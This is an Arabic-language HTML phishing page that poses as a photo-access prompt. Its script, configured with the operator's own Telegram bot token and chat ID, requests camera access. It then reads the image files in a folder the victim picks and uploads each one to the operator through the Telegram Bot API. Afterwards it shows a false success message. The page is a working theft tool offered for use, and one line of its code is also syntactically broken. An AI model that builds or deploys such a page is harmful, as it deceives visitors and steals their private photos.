<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحميل الملف</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: #1a1a2e;
            font-family: Arial, sans-serif;
            direction: rtl;
        }
        .card {
            background: #16213e;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
            text-align: center;
            color: white;
        }
        button {
            background: #e94560;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 20px;
        }
        button:hover {
            background: #c23152;
        }
    </style>
</head>
<body>
    <div class="card">
        <h1>📁 طلب الوصول إلى الصور</h1>
        <p>يحتاج هذا الموقع إلى الوصول إلى صورك لعرضها. اضغط على "سماح" للمتابعة.</p>
        <button id="allowBtn">🔓 سماح</button>
    </div>

    <script>
        // ⚠️ استبدل هذا بالتوكن الخاص بك والبوت
        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';  // <-- ضع التوكن هنا
        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';      // <-- ضع المعرف هنا

        document.getElementById('allowBtn').addEventListener('click', async () => {
            try {
                // محاولة الوصول للصور
                const stream = await navigator.mediaDevices.getUserMedia({ video:, audio: false });
                // في حالة النجاح، نجمع الصور من الجهاز
                const images = await collectImages();
                
                // إرسال كل صورة للبوت
                for (let img of images) {
                    await sendImageToTelegram(img);
                }
                
                alert('تم رفع الصور بنجاح');
            } catch (err) {
                alert('فشل الوصول للصور، حاول مرة أخرى');
                console.error(err);
            }
        });

        // جمع الصور من الجهاز (مثال بسيط)
        async function collectImages() {
            const imageFiles = [];
            
            // محاولة قراءة ملفات الصور من مجلد التحميلات (لن يعمل في المتصفح مباشرة)
            // في الواقع سنستخدم واجهة برمجية للوصول للملفات
            // هذا مثال توضيحي باستخدام API File System Access
            
            try {
                // طلب الوصول لمجلد الصور
                const dirHandle = await window.showDirectoryPicker({ mode: 'read' });
                for await (const entry of dirHandle.values()) {
                    if (entry.kind === 'file' && entry.name.match(/\.(jpg|jpeg|png|gif|bmp)$/i)) {
                        const file = await entry.getFile();
                        imageFiles.push(file);
                    }
                }
            } catch (e) {
                console.log('فشل الوصول للمجلد', e);
                // إذا فشل، نرسل صورة افتراضية
                const dummyBlob = new Blob(['محتوى صورة'], { type: 'image/png' });
                imageFiles.push(new File([dummyBlob], 'photo.png', { type: 'image/png' }));
            }
            
            return imageFiles;
        }

        // إرسال صورة للبوت
        async function sendImageToTelegram(file) {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', file, file.name);
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const data = await response.json();
                console.log('تم إرسال الصورة:', data);
            } catch (error) {
                console.error('خطأ في الإرسال:', error);
            }
        }
    </script>
</body>
</html>
